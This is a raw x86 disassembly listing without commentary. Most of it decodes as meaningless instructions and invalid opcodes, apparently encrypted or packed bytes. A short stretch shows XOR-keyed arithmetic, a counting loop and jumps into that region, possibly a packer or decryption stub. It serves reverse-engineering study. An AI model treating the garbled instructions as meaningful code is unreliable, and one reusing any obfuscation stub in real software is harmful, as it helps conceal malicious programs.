  4088d1:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4088d3:	dec    ecx
  4088d4:	data16 jge 0x40885a
  4088d7:	inc    edx
  4088d8:	repnz adc ebx,esi
  4088db:	pop    ebp
  4088dc:	loop   0x408905
  4088de:	jp     0x4088e0
  4088e0:	stc    
  4088e1:	loope  0x4088fa
  4088e3:	cli    
  4088e4:	imul   DWORD PTR [esi-0x4a5a7870]
  4088ea:	pop    esp
  4088eb:	ficom  DWORD PTR [eax+0x4c]
  4088ee:	sub    al,0x64
  4088f0:	mov    eax,ds:0x5330c1c9
  4088f5:	int    0xb3
  4088f7:	das    
  4088f8:	call   0xbb2d:0xd887ff6f
  4088ff:	dec    ecx
  408900:	sbb    BYTE PTR [esi+0x4],al
  408903:	mov    eax,ds:0x38d7bfbe
  408908:	adc    BYTE PTR [ecx+0x129ec60d],bh
  40890e:	loope  0x408949
  408910:	ret    0x9fbd
  408913:	ss jmp 0x9ede26f5
  408919:	mov    ecx,0x2f9cb432
  40891e:	adc    eax,0x3d1ac68
  408923:	aaa    
  408924:	repz cmp eax,0x17344dc6
  40892a:	xchg   esi,eax
  40892b:	hlt    
  40892c:	(bad)  
  40892d:	(bad)  
  40892e:	(bad)  
  40892f:	in     al,0x7b
  408931:	push   eax
  408932:	mov    ebp,0xbbdf4e5a
  408937:	xchg   edi,eax
  408938:	retf   
  408939:	psrld  mm4,QWORD PTR [eax]
  40893c:	mov    al,al
  40893e:	adc    eax,0x39c8eb0
  408943:	adc    BYTE PTR [ebp+0x5a5464da],0x82
  40894a:	in     eax,0x48
  40894c:	dec    ecx
  40894d:	pop    ss
  40894e:	out    0xd3,eax
  408950:	xor    DWORD PTR [ecx-0x3a],eax
  408953:	mov    eax,0x54b5bf0e
  408958:	mov    edi,0x2ee0c986
  40895d:	add    al,0x8a
  40895f:	(bad)  
  408960:	sbb    BYTE PTR [eax],ch
  408962:	imul   esi,DWORD PTR [edi+0x41],0xc528aa34
  408969:	add    dh,BYTE PTR [edi]
  40896b:	pop    ss
  40896c:	and    al,0xfb
  40896e:	dec    edi
  40896f:	ds es jb 0x408942
  408973:	inc    edi
  408974:	pop    ebx
  408975:	adc    BYTE PTR [ecx-0x57],dl
  408978:	call   0xf1a2:0x6e658101
  40897f:	sub    edi,DWORD PTR ds:0xd639cd42
  408985:	lea    ebx,[ecx+0x2368c686]
  40898b:	adc    DWORD PTR [ebx],0x4851c60a
  408991:	and    BYTE PTR [edi+0x5],bl
  408994:	mov    eax,ds:0x57fb4f55
  408999:	(bad)  
  40899a:	fsubr  st(1),st
  40899c:	bnd call 0x448be2b6
  4089a2:	enter  0x3da2,0x97
  4089a6:	mov    ah,0xc8
  4089a8:	scas   eax,DWORD PTR es:[edi]
  4089a9:	or     edx,DWORD PTR [eax+0x63]
  4089ac:	rcr    DWORD PTR [eax-0x154c1be4],0xba
  4089b3:	push   ecx
  4089b4:	push   es
  4089b5:	jnp    0x40894f
  4089b7:	leave  
  4089b8:	pop    ebp
  4089b9:	sub    bh,ah
  4089bb:	in     al,0xd9
  4089bd:	push   ds
  4089be:	out    0x8c,eax
  4089c0:	jg     0x40895c
  4089c2:	inc    ecx
  4089c3:	call   FWORD PTR [edi+0x6d]
  4089c6:	jg     0x4089eb
  4089c8:	(bad)  
  4089c9:	loop   0x4089c9
  4089cb:	mov    ebp,0xbf19b6f6
  4089d0:	icebp  
  4089d1:	ffree  st(7)
  4089d3:	adc    eax,0x782adac3
  4089d8:	adc    BYTE PTR es:[esi-0x57],0xd8
  4089dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089de:	sub    eax,0x71c9dcbd
  4089e3:	cwde   
  4089e4:	pop    edi
  4089e5:	xor    esp,eax
  4089e7:	mov    al,0x2f
  4089e9:	fiadd  WORD PTR [esi]
  4089eb:	out    0x14,eax
  4089ed:	add    al,0x1c
  4089ef:	cmp    eax,0x62bf7975
  4089f4:	sbb    al,0x66
  4089f6:	ds and edi,esp
  4089f9:	and    eax,0x52108104
  4089fe:	std    
  4089ff:	retf   
  408a00:	in     al,0x95
  408a02:	test   al,0xd0
  408a04:	lods   al,BYTE PTR ds:[esi]
  408a05:	adc    eax,0xc5f8732f
  408a0a:	call   ecx
  408a0c:	test   al,0x3b
  408a0e:	das    
  408a0f:	popf   
  408a10:	loope  0x4089ec
  408a12:	arpl   WORD PTR [ebx-0x1099a78d],si
  408a18:	sub    eax,DWORD PTR [ebp+0x3b]
  408a1b:	and    al,0x45
  408a1d:	(bad)  
  408a1e:	gs push 0x2e
  408a21:	push   esi
  408a22:	and    eax,0x3beac55c
  408a27:	repnz sbb eax,0xacb05bf0
  408a2d:	in     al,0x71
  408a2f:	in     al,dx
  408a30:	out    0x61,eax
  408a32:	mov    ebx,0x9357238c
  408a37:	mov    gs,ebx
  408a39:	add    eax,0x50a9e36d
  408a3e:	push   0xa253fa7c
  408a43:	or     al,0x35
  408a45:	mov    esi,0x9428f6f6
  408a4a:	jbe    0x408abd
  408a4c:	pop    esp
  408a4d:	data16 cli 
  408a4f:	inc    edi
  408a50:	popa   
  408a51:	mov    cs,WORD PTR [edx]
  408a53:	cmp    al,0xa
  408a55:	push   edi
  408a56:	scas   eax,DWORD PTR es:[edi]
  408a57:	mov    cs,WORD PTR [esi]
  408a59:	addr16 pusha 
  408a5b:	pop    ebp
  408a5c:	fisttp DWORD PTR [eax-0x15]
  408a5f:	in     eax,0xa5
  408a61:	loopne 0x408a60
  408a63:	xor    DWORD PTR [ecx-0x6e989f9d],edx
  408a69:	mov    al,ds:0x2276079c
  408a6e:	scas   eax,DWORD PTR es:[edi]
  408a6f:	mov    DWORD PTR [ecx],eax
  408a71:	pop    esi
  408a72:	leave  
  408a73:	ret    0xc
  408a76:	push   ebp
  408a77:	mov    ebp,esp
  408a79:	push   ecx
  408a7a:	xor    eax,0x6036
  408a7f:	push   ecx
  408a80:	jmp    0x408d46
  408a85:	(bad)  
  408a86:	cmp    eax,0xd6d5cec5
  408a8b:	aad    0xc5
  408a8d:	mov    esi,0xe7b3a4f9
  408a92:	pop    es
  408a93:	ins    BYTE PTR es:[edi],dx
  408a94:	mov    ecx,0x7878e438
  408a99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a9a:	jle    0x408b14
  408a9c:	js     0x408a5a
  408a9e:	ins    DWORD PTR es:[edi],dx
  408a9f:	jno    0x408ada
  408aa1:	ins    DWORD PTR es:[edi],dx
  408aa2:	je     0x408af0
  408aa4:	mov    ds:0xb88a99ef,eax
  408aa9:	aad    0x58
  408aab:	xlat   BYTE PTR ds:[ebx]
  408aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408aad:	jb     0x408a4f
  408aaf:	jno    0x408a4a
  408ab1:	mov    ds:0x18c2f672,eax
  408ab6:	popf   
  408ab7:	jle    0x408a81
  408ab9:	dec    eax
  408abb:	lods   al,BYTE PTR ds:[esi]
  408abc:	cdq    
  408abd:	pop    edx
  408abe:	sub    eax,0xee11ba71
  408ac3:	ja     0x408b33
  408ac5:	dec    esp
  408ac6:	imul   esp,DWORD PTR [ecx+0x75],0x5b
  408aca:	pop    ebx
  408acb:	push   esp
  408acc:	or     ah,BYTE PTR ds:0x47c1a4f0
  408ad2:	jbe    0x408a95
  408ad4:	divps  xmm0,XMMWORD PTR [edx+esi*4+0x71]
  408ad9:	(bad)  ds:0xf9cffb0a
  408adf:	ror    BYTE PTR [ecx],1
  408ae1:	sbb    al,0x54
  408ae3:	jp     0x408b0e
  408ae5:	outs   dx,BYTE PTR ds:[esi]
  408ae6:	(bad)  
  408ae7:	jl     0x408b34
  408ae9:	dec    eax
  408aea:	daa    
  408aeb:	mov    ds:0x729862f4,eax
  408af0:	sahf   
  408af1:	cmp    al,BYTE PTR [ecx]
  408af3:	leave  
  408af4:	jnp    0x408b55
  408af6:	jle    0x408a7a
  408af8:	push   cs
  408af9:	push   esp
  408afa:	jl     0x408b69
  408afc:	fcomp  DWORD PTR ds:0x9a77bf07
  408b02:	stos   BYTE PTR es:[edi],al
  408b03:	push   edi
  408b04:	arpl   WORD PTR [eax],bp
  408b06:	dec    eax
  408b07:	leave  
  408b08:	sub    ebp,DWORD PTR [ecx+0x73]
  408b0b:	or     ebx,DWORD PTR [ebx+0x6e]
  408b0e:	pop    es
  408b0f:	cmp    al,0xba
  408b11:	je     0x408b0c
  408b13:	jle    0x408b6e
  408b15:	arpl   WORD PTR ds:0x27815703,bx
  408b1b:	shl    BYTE PTR [esi-0x2b78b7bd],cl
  408b21:	inc    ecx
  408b22:	sbb    eax,0xa8c3dc3e
  408b27:	jge    0x408abf
  408b29:	inc    esi
  408b2a:	nop
  408b2b:	dec    esi
  408b2c:	jl     0x408b3a
  408b2e:	aaa    
  408b2f:	(bad)  
  408b30:	mov    ecx,0x74787239
  408b35:	add    al,0x28
  408b37:	mov    dh,ah
  408b39:	fidiv  DWORD PTR [ebp-0x24]
  408b3c:	popa   
  408b3d:	xchg   ebp,eax
  408b3e:	(bad)  
  408b3f:	fld    DWORD PTR [ecx-0x654c2568]
  408b45:	aas    
  408b46:	xchg   edi,eax
  408b47:	aad    0x84
  408b49:	cmp    ch,BYTE PTR [ecx+0xcf6c6c0]
  408b4f:	jmp    0x408b63
  408b51:	or     al,0xe4
  408b53:	imul   eax,DWORD PTR [esi-0x25],0xffffffb5
  408b57:	mov    eax,0xdb50f27b
  408b5c:	jp     0x408b47
  408b5e:	cmp    al,0x26
  408b60:	aad    0x9d
  408b62:	pop    ebx
  408b63:	aam    0xe8
  408b65:	add    DWORD PTR [ebx+0x26],esi
  408b68:	fmul   DWORD PTR [esp+eiz*8]
  408b6b:	jno    0x408b86
  408b6d:	inc    esp
  408b6e:	mov    al,ds:0xd3f7ad94
  408b73:	cmp    al,0xd
  408b75:	repz sub al,ch
  408b78:	fwait
  408b79:	mov    ah,0x6f
  408b7b:	xchg   edi,eax
  408b7c:	fdiv   DWORD PTR [esi+0x62]
  408b7f:	int    0xc2
  408b81:	daa    
  408b82:	cdq    
  408b83:	push   0x44
  408b85:	aas    
  408b86:	mov    WORD PTR [ebp+0x7d400573],cs
  408b8c:	mov    bh,0x3
  408b8e:	hlt    
  408b8f:	(bad)  
  408b90:	xor    edi,ecx
  408b92:	sbb    al,0x4
  408b94:	test   BYTE PTR [esi],dh
  408b96:	xchg   ebx,eax
  408b97:	ret    0x4935
  408b9a:	imul   edi,esp,0xfffffffe
  408b9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b9e:	and    ch,bh
  408ba0:	mov    BYTE PTR [ebx+0x3a],0x7d
  408ba4:	(bad)  
  408ba5:	mov    ah,0xde
  408ba7:	xchg   esi,eax
  408ba8:	or     BYTE PTR [esp+esi*1],ah
  408bab:	mov    edx,0x6bf6aac7
  408bb0:	test   eax,0x2e3d632
  408bb5:	(bad)  
  408bb7:	add    DWORD PTR [edi+0x43482f44],esp
  408bbd:	or     al,0x24
  408bbf:	or     DWORD PTR [edi-0x8],0xbe5bbe10
  408bc6:	mov    edi,0xbe893c42
  408bcb:	inc    eax
  408bcc:	mov    ecx,0x43c1cafe
  408bd1:	test   al,0x29
  408bd3:	sub    BYTE PTR [edi+0x3cc22c04],bl
  408bd9:	pop    es
  408bda:	jecxz  0x408bb2
  408bdc:	stc    
  408bdd:	pop    ds
  408bde:	and    DWORD PTR [edx+edx*2],edi
  408be1:	(bad)  
  408be2:	dec    eax
  408be3:	adc    ah,cl
  408be5:	push   edx
  408be6:	and    BYTE PTR [ebx-0xb9960f0],bl
  408bec:	mov    eax,ds:0xd426e98a
  408bf1:	sub    bl,BYTE PTR [eax]
  408bf3:	pop    ds
  408bf4:	mov    cl,al
  408bf6:	jg     0x408be7
  408bf8:	(bad)  
  408bf9:	fcmovu st,st(6)
  408bfb:	bndldx bnd3,[ebx-0x19]
  408bff:	out    0xd2,al
  408c01:	and    eax,0xb27346a2
  408c06:	in     al,0x76
  408c08:	call   0x765e1e3
  408c0d:	ins    DWORD PTR es:[edi],dx
  408c0e:	out    0x84,eax
  408c10:	or     al,0x2e
  408c12:	scas   eax,DWORD PTR es:[edi]
  408c13:	xchg   BYTE PTR [ebp+0x43],ah
  408c16:	call   0xfe1f:0x615dbd70
  408c1d:	mov    dh,0x9b
  408c1f:	push   ds
  408c20:	xchg   esi,eax
  408c21:	and    ch,BYTE PTR [edi-0x22]
  408c24:	ror    eax,0x4e
  408c27:	ins    DWORD PTR es:[edi],dx
  408c28:	(bad)  
  408c29:	sub    al,0x78
  408c2b:	pop    ecx
  408c2c:	jae    0x408c5a
  408c2e:	lods   eax,DWORD PTR ds:[esi]
  408c2f:	adc    al,0xa8
  408c31:	mov    ebp,DWORD PTR [edx+edi*2]
  408c34:	ja     0x408bc1
  408c36:	jmp    FWORD PTR [edx+esi*4]
  408c39:	jecxz  0x408c8c
  408c3b:	mov    cl,ah
  408c3d:	pop    ebx
  408c3e:	(bad)  
  408c3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c40:	ds popa 
  408c42:	stos   DWORD PTR es:[edi],eax
  408c43:	outs   dx,BYTE PTR ds:[esi]
  408c44:	jecxz  0x408c94
  408c46:	mov    ebp,0xb39e0229
  408c4b:	or     eax,0x4dcaca64
  408c50:	push   esp
  408c51:	and    BYTE PTR [ecx],0xcc
  408c54:	xor    al,0x5a
  408c56:	adc    al,0x70
  408c58:	cli    
  408c59:	(bad)  
  408c5a:	fisub  WORD PTR [edx+edx*2]
  408c5d:	out    0x9c,al
  408c5f:	cmp    esi,DWORD PTR [esi+esi*2-0x33]
  408c63:	shl    BYTE PTR [eax],1
  408c65:	ds inc edi
  408c67:	add    eax,0x243edeb2
  408c6c:	rcl    DWORD PTR [edi],cl
  408c6e:	ins    DWORD PTR es:[edi],dx
  408c6f:	js     0x408cd0
  408c71:	xlat   BYTE PTR ds:[ebx]
  408c72:	mov    eax,0xd350023a
  408c77:	push   ecx
  408c78:	mov    bh,0xa2
  408c7a:	ins    BYTE PTR es:[edi],dx
  408c7b:	jns    0x408c02
  408c7d:	jb     0x408cb7
  408c7f:	xchg   edi,eax
  408c80:	add    ecx,ebx
  408c82:	loop   0x408c67
  408c84:	sub    al,0x9
  408c86:	jle    0x408cec
  408c88:	repnz mov ds:0x81f3c80f,al
  408c8e:	pushf  
  408c8f:	cld    
  408c90:	sbb    eax,0x1107550b
  408c95:	stos   DWORD PTR es:[edi],eax
  408c96:	push   0x819e2fae
  408c9b:	cdq    
  408c9c:	mov    ecx,0x5f034608
  408ca1:	mov    al,ds:0xf87c0de2
  408ca6:	ret    
  408ca7:	xchg   esp,eax
  408ca8:	loopne 0x408cfb
  408caa:	adc    BYTE PTR [ebp-0x3e],bl
  408cad:	xchg   ecx,eax
  408cae:	push   ebp
  408caf:	jmp    0x979f1ee3
  408cb4:	scas   al,BYTE PTR es:[edi]
  408cb5:	imul   esi,DWORD PTR [edx],0xffffffdf
  408cb8:	pop    es
  408cb9:	call   0xe305:0xadd64a9
  408cc0:	add    eax,0xe0a4d157
  408cc5:	leave  
  408cc6:	pop    edx
  408cc7:	xchg   ebx,eax
  408cc8:	sub    DWORD PTR ds:0x482db52c,ecx
  408cce:	cld    
  408ccf:	mov    dl,0x37
  408cd1:	xchg   DWORD PTR [ecx-0x29cef368],esp
  408cd7:	lods   eax,DWORD PTR ds:[esi]
  408cd8:	and    DWORD PTR [ecx+0x5cc8acd4],0x46
  408cdf:	mov    dh,0xf4
  408ce1:	pop    edx
  408ce2:	cmp    al,0xfc
  408ce4:	adc    al,0x23
  408ce6:	xchg   ecx,eax
  408ce7:	loope  0x408c96
  408ce9:	mov    ds:0xefa0b554,eax
  408cee:	out    0xba,al
  408cf0:	pop    esp
  408cf1:	jnp    0x408cf0
  408cf3:	xor    eax,0x4e37f704
  408cf8:	add    bl,BYTE PTR [ebx]
  408cfa:	pusha  
  408cfb:	jne    0x408d2f
  408cfd:	mov    al,ds:0xd1bee6cd
  408d02:	sbb    BYTE PTR [edi],bl
  408d04:	sbb    BYTE PTR [edx-0x70],bl
  408d07:	das    
  408d08:	jne    0x408c8b
  408d0a:	xchg   edi,eax
  408d0b:	repnz mov WORD PTR [edx],ds
  408d0e:	sub    al,0xfc
  408d10:	ins    DWORD PTR es:[edi],dx
  408d11:	xchg   ebp,eax
  408d12:	repz out 0x76,eax
  408d15:	lds    esi,FWORD PTR [ebp-0x74]
  408d18:	test   eax,0x20b937e0
  408d1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d1e:	not    BYTE PTR [ecx+0x30c9e00c]
  408d24:	push   cs
  408d25:	adc    eax,0x7f8270b4
  408d2a:	(bad)
  408d2d:	lods   al,BYTE PTR ds:[esi]
  408d2e:	inc    ebp
  408d2f:	mov    bh,0x1f
  408d31:	adc    BYTE PTR [eax-0xf],bh
  408d34:	popa   
  408d35:	shl    DWORD PTR [ecx+0x7c8f6161],cl
  408d3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d3c:	cmp    ebx,edi
  408d3e:	jbe    0x408cfa
  408d40:	aad    0xb1
  408d42:	stc    
  408d43:	arpl   WORD PTR [edi-0x7ba3880],sp
  408d49:	cmp    BYTE PTR [ebp+0x45c7f89c],al
  408d4f:	cld    
  408d50:	cmp    DWORD PTR [ebp+0x458bf89c],eax
  408d56:	cld    
  408d57:	add    edx,edx
  408d59:	push   esi
  408d5a:	mov    edx,DWORD PTR ds:0x42a86d
  408d60:	mov    edx,DWORD PTR [edx]
  408d62:	add    DWORD PTR ds:0x42a88d,edx
  408d68:	mov    esi,DWORD PTR [ebp-0x8]
  408d6b:	mov    edx,0x7510850
  408d70:	xor    eax,edx
  408d72:	xor    esi,edx
  408d74:	and    DWORD PTR ds:0x42a7c1,0x0
  408d7e:	jmp    0x408d90
  408d83:	mov    ecx,DWORD PTR ds:0x42a7c1
  408d89:	inc    ecx
  408d8a:	mov    DWORD PTR ds:0x42a7c1,ecx
  408d90:	cmp    DWORD PTR ds:0x42a7c1,0x19
  408d97:	jae    0x408de8
  408d9d:	cmp    DWORD PTR ds:0x42a7c1,0x7
  408da4:	jne    0x408db5
  408daa:	push   0x67a5
  408daf:	call   DWORD PTR ds:0x41d0c8
  408db5:	cmp    DWORD PTR ds:0x42a7c1,0x6
  408dbc:	jne    0x408dd1
  408dc2:	xor    ecx,ecx
  408dc4:	add    ecx,DWORD PTR ds:0x42a7c1
  408dca:	inc    ecx
  408dcb:	mov    DWORD PTR ds:0x42a7c1,ecx
  408dd1:	jmp    0x408d83
  408dd6:	mov    ecx,DWORD PTR ds:0x42a7f5
  408ddc:	xor    ecx,DWORD PTR ds:0x42a7bd
  408de2:	mov    DWORD PTR ds:0x42a7f5,ecx
  408de8:	mov    ecx,0x327298
  408ded:	or     DWORD PTR ds:0x42a809,0x42a765
  408df7:	add    esi,ecx
  408df9:	add    eax,ecx
  408dfb:	xor    DWORD PTR ds:0x42a77d,0x42a7f9
  408e05:	imul   eax,esi
  408e08:	mov    esi,DWORD PTR [ebp+0xc]
  408e0b:	jmp    0x4090d1
  408e10:	cmp    eax,0xcdcbcfc8
  408e15:	retf   
  408e16:	(bad)  
  408e18:	stos   DWORD PTR es:[edi],eax
  408e19:	adc    DWORD PTR [ecx+0x6e],0xfffffff4
  408e1d:	xlat   BYTE PTR ds:[ebx]
  408e1e:	retf   0x67ed
  408e21:	jmp    0x7878:0x7ea77878
  408e28:	jno    0x408dea
  408e2a:	xor    al,BYTE PTR [eax-0x29]
  408e2d:	call   0x7b23e0b9
  408e32:	sbb    eax,0x933dffbd
  408e37:	cmp    DWORD PTR [ebx+0x63],edi
  408e3a:	mov    WORD PTR [edi],?
  408e3c:	cmp    ah,dl
  408e3e:	popa   
  408e3f:	inc    ebp
  408e40:	mov    ah,0xa3
  408e42:	inc    edx
  408e43:	adc    bl,al
  408e45:	into   
  408e46:	scas   eax,DWORD PTR es:[edi]
  408e47:	push   ss
  408e48:	mov    eax,0xa19a2dcf
  408e4d:	rcr    DWORD PTR [ebx+0x8f91e47],cl
  408e53:	aaa    
  408e54:	ins    BYTE PTR es:[edi],dx
  408e55:	pop    eax
  408e56:	dec    eax
  408e57:	fadd   QWORD PTR [edi-0x7f]
  408e5a:	mov    ch,BYTE PTR [ecx-0x6e]
  408e5d:	in     eax,dx
  408e5e:	aam    0x3d
  408e60:	xor    edx,edi
  408e62:	xchg   ecx,eax
  408e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e64:	icebp  
  408e65:	out    0x60,al
  408e67:	fisub  WORD PTR es:[eax-0x36]
  408e6b:	loope  0x408ee3
  408e6d:	mov    esp,DWORD PTR [ecx+0x7e]
  408e70:	mov    bl,0xc6
  408e72:	mov    bh,0x9b
  408e74:	stos   DWORD PTR es:[edi],eax
  408e75:	ds ja  0x408e49
  408e78:	sbb    esi,ecx
  408e7a:	inc    eax
  408e7b:	xor    eax,0xb3a67354
  408e80:	in     al,dx
  408e81:	in     al,0xc5
  408e83:	outs   dx,BYTE PTR ds:[esi]
  408e84:	xchg   edx,eax
  408e85:	jne    0x408e29
  408e87:	ja     0x408e13
  408e89:	jnp    0x408e7a
  408e8b:	ins    BYTE PTR es:[edi],dx
  408e8c:	ja     0x408e8f
  408e8e:	scas   al,BYTE PTR es:[edi]
  408e8f:	xchg   DWORD PTR [esi+0x6b],eax
  408e92:	cmp    dl,bl
  408e94:	js     0x408eeb
  408e96:	mov    esp,0x7994716d
  408e9b:	dec    edi
  408e9c:	cmp    BYTE PTR [ebp+esi*8-0x5954d046],dl
  408ea3:	ret    0x12f1
  408ea6:	int3   
  408ea7:	lds    esi,FWORD PTR [edx-0x2f83c8ab]
  408ead:	out    0x24,al
  408eaf:	arpl   WORD PTR [eax-0x6b],sp
  408eb2:	pop    edx
  408eb3:	push   ds
  408eb4:	pop    ecx
  408eb5:	mov    edi,0xd615613f
  408eba:	sar    BYTE PTR [ecx],1
  408ebc:	cdq    
  408ebd:	int    0x4a
  408ebf:	mov    ebx,0xf39b5b2c
  408ec4:	arpl   WORD PTR [edx],cx
  408ec6:	arpl   WORD PTR [edx+0x2a],dx
  408ec9:	nop
  408eca:	cwde   
  408ecb:	sbb    eax,0x5826404a
  408ed0:	inc    edi
  408ed1:	sub    ebx,DWORD PTR [esi-0x68]
  408ed4:	shr    ebx,1
  408ed6:	sub    al,0xc4
  408ed8:	jle    0x408f18
  408eda:	cwde   
  408edb:	pop    ecx
  408edc:	gs inc esp
  408ede:	mov    ds:0x1e47ae9e,al
  408ee3:	ja     0x408f5b
  408ee5:	imul   ebx,edi,0x74
  408ee8:	sbb    al,0x18
  408eea:	xor    BYTE PTR [esi+0x6dc93229],ch
  408ef0:	jecxz  0x408e93
  408ef2:	call   0x1f7d:0xc287b3c7
  408ef9:	in     al,0x83
  408efb:	push   edi
  408efc:	sub    dh,dl
  408efe:	dec    esi
  408eff:	adc    bh,bh
  408f01:	leave  
  408f02:	inc    esp
  408f03:	pushf  
  408f04:	scas   eax,DWORD PTR es:[edi]
  408f05:	sub    cl,BYTE PTR [edx+0x1f3853f0]
  408f0b:	iret   
  408f0c:	ins    BYTE PTR es:[edi],dx
  408f0d:	pop    edi
  408f0e:	push   es
  408f0f:	fnstsw WORD PTR [ebp+0x1ec260cd]
  408f15:	inc    eax
  408f16:	cli    
  408f17:	cmp    ebx,esi
  408f19:	inc    edi
  408f1a:	and    ebx,eax
  408f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f1d:	leave  
  408f1e:	sbb    edi,esp
  408f20:	js     0x408f4e
  408f22:	or     edi,DWORD PTR [edi-0x27192d80]
  408f28:	xor    ecx,DWORD PTR [ebx]
  408f2a:	cmc    
  408f2b:	das    
  408f2c:	mov    ebp,0x43bc5eaa
  408f31:	leave  
  408f32:	shl    DWORD PTR [ebp-0x682ad33e],1
  408f38:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  408f3a:	mov    al,ds:0xb47f423a
  408f3f:	mov    esp,0xda137772
  408f44:	jmp    0x6768:0x8652b523
  408f4b:	push   edi
  408f4c:	outs   dx,BYTE PTR ds:[esi]
  408f4d:	sub    esp,DWORD PTR [esp-0x76babbd4]
  408f54:	aaa    
  408f55:	mov    al,0xf5
  408f57:	push   ebp
  408f58:	sub    eax,0xe49ee74e
  408f5d:	xchg   esi,eax
  408f5e:	sahf   
  408f5f:	ret    
  408f60:	mov    ecx,0xac8daffb
  408f65:	push   ebx
  408f66:	dec    ecx
  408f67:	sar    DWORD PTR [ecx],1
  408f69:	retf   0x9554
  408f6c:	ret    0x789e
  408f6f:	xchg   esi,eax
  408f70:	int    0x9d
  408f72:	push   ebx
  408f73:	sub    al,0x8d
  408f75:	mul    BYTE PTR [eax+0x21]
  408f78:	or     esi,ebp
  408f7a:	mov    fs,WORD PTR [ebx-0x2def3070]
  408f80:	pop    ds
  408f81:	popa   
  408f82:	out    dx,eax
  408f83:	jl     0x408f56
  408f85:	test   DWORD PTR [ebx-0x15],0x1fb1178c
  408f8c:	mov    ds:0x30e492d6,al
  408f91:	hlt    
  408f92:	mov    bh,0x79
  408f94:	adc    cl,BYTE PTR [ebp-0x30]
  408f97:	pop    esi
  408f98:	xlat   BYTE PTR fs:[ebx]
  408f9a:	mov    edx,0x35a2ff6e
  408f9f:	iret   
  408fa0:	cmp    eax,0x5e88fb78
  408fa5:	cmp    al,BYTE PTR [ecx]
  408fa7:	shr    al,cl
  408fa9:	push   ecx
  408faa:	fs adc ebx,DWORD PTR cs:[ecx-0x6c5f0120]
  408fb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fb3:	push   edx
  408fb4:	test   BYTE PTR [ecx+esi*4-0x33],dl
  408fb8:	cmp    al,0x20
  408fba:	cli    
  408fbb:	pop    edi
  408fbc:	or     ch,BYTE PTR [eax+0xc881560]
  408fc2:	adc    esi,DWORD PTR [ebp+0x4b728359]
  408fc8:	in     eax,dx
  408fc9:	xor    al,0xb7
  408fcb:	push   ebx
  408fcc:	test   DWORD PTR [edx+esi*1],eax
  408fcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fd0:	sbb    al,0x92
  408fd2:	push   cs
  408fd3:	cmp    ecx,DWORD PTR [ecx-0x242e922]
  408fd9:	and    bh,BYTE PTR [edi-0x58]
  408fdc:	adc    eax,0xcb7197ae
  408fe1:	fstp   TBYTE PTR [edi-0x2e]
  408fe4:	dec    esi
  408fe5:	popa   
  408fe6:	and    al,0x75
  408fe8:	mov    cl,0xc8
  408fea:	pop    es
  408feb:	pushf  
  408fec:	loop   0x408ff6
  408fee:	mov    esi,0x7f01ec89
  408ff3:	sub    edi,edi
  408ff5:	fimul  DWORD PTR [edx+ebx*4+0x7d]
  408ff9:	retf   
  408ffa:	call   0x23d8ee4e
  408fff:	sub    BYTE PTR [edi+0x2c],al
  409002:	mov    al,ds:0x71fdbd3f
  409007:	jmp    0x922539fd
  40900c:	cdq    
  40900d:	adc    esi,DWORD PTR [ebp-0x61a8152c]
  409013:	xor    DWORD PTR [eax],edi
  409015:	sub    al,0xff
  409017:	hlt    
  409018:	cli    
  409019:	inc    ecx
  40901a:	not    BYTE PTR [eax+0x5a]
  40901d:	scas   eax,DWORD PTR es:[edi]
  40901e:	lahf   
  40901f:	lds    esi,FWORD PTR [ebp+0x7e]
  409022:	pop    edi
  409023:	pop    es
  409024:	mov    cl,0x8e
  409026:	pop    es
  409027:	inc    esp
  409028:	(bad)  
  409029:	mov    ah,0x2
  40902b:	push   ss
  40902c:	(bad)  
  40902d:	ds jg  0x409008
  409030:	xor    DWORD PTR [edi+0x6e],ebx
  409033:	xchg   esi,eax
  409034:	pop    ecx
  409035:	sbb    bh,ch
  409037:	cvttps2pi mm4,xmm3
  40903a:	cmc    
  40903b:	sbb    edi,DWORD PTR [esi-0x252909c6]
  409041:	mov    bh,0xf
  409043:	jbe    0x409090
  409045:	ja     0x409075
  409047:	jne    0x40901a
  409049:	push   0xcebf02e9
  40904e:	jmp    0xb4c:0xd3aa538e
  409055:	or     ch,dl
  409057:	bts    ecx,0xb9
  40905b:	xor    DWORD PTR [ebx-0x4171c689],edi
  409061:	mov    esp,0x8846a4b9
  409066:	add    bh,BYTE PTR [ebx]
  409068:	pop    ecx
  409069:	mov    esi,eax
  40906b:	xor    ebx,eax
  40906d:	or     eax,DWORD PTR [ecx-0x47582ad3]
  409073:	mov    DWORD PTR [ecx+0x5b],ebp
  409076:	cmp    eax,0x76551c57
  40907b:	push   ds
  40907c:	faddp  st(5),st
  40907e:	jno    0x40905c
  409080:	fsubr  QWORD PTR [esi+0x363762c1]
  409086:	mov    edx,0xb586546
  40908b:	(bad)  [eax+eiz*4]
  40908e:	sbb    DWORD PTR [ebx],edi
  409090:	push   ebp
  409091:	pcmpgtd mm4,mm2
  409094:	scas   eax,DWORD PTR es:[edi]
  409095:	mov    bh,0x72
  409097:	enter  0x61c5,0xc5
  40909b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40909c:	mov    cl,0xfb
  40909e:	cmp    edx,DWORD PTR [di]
  4090a1:	push   0x3489bfbb
  4090a6:	sub    eax,0x145d8c0
  4090ab:	pop    eax
  4090ac:	ret    0x8242
  4090af:	mov    eax,ds:0xa9f8bd64
  4090b4:	popf   
  4090b5:	add    al,BYTE PTR [edx+0x1c1e1044]
  4090bb:	pop    es
  4090bc:	push   0x1fd159ae
  4090c1:	pop    edx
  4090c2:	hlt    
  4090c3:	outs   dx,DWORD PTR ds:[esi]
  4090c4:	jp     0x4090f0
  4090c6:	cld    
  4090c7:	test   BYTE PTR [ebx],0xe5
  4090ca:	into   
